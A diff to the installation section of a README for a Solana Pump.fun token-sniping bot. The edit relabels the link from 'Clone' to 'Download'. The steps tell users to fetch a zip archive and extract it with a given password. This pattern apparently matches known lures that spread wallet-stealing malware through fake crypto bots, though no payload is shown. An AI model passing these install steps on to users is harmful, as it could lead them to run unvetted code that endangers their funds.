@@ -16,7 +16,7 @@ Bot for sniping tokens listed on Pump.fun in the Solana network using C# and the
 - **Live Price Tracking**: Delivers real-time updates and continuous monitoring of token prices.
 
 ## Installation
-- [Clone](https://github.com/sui-sensei/pump.fun/archive/refs/heads/main.zip) the repository.
+- [Download](https://github.com/sui-sensei/pump.fun/archive/refs/heads/main.zip) the repository.
 - extract archive with pass `AcY20jQe`.
 - create a `config.json` in the project's root directory and define your environment variables. You can use the provided `config.json`.
 - run the bot.
